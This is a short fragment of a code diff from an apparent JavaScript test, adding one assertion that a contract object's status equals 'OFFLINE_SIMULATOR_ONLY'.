+  assert.equal(contract.status, "OFFLINE_SIMULATOR_ONLY");
 });
